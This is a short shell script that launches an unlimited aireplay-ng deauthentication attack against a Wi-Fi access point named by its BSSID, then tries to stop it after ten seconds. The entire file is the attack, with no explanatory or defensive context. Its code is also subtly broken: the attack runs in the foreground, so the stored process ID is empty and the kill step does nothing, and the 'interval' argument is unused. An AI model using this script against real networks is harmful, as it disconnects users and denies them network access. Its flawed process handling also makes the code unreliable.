#!/bin/sh

BSSID=$1
interface=$2
interval=$3


aireplay-ng --deauth 0 -a $BSSID $interface
aireplayPID=$!
sleep 10
kill $aireplayPID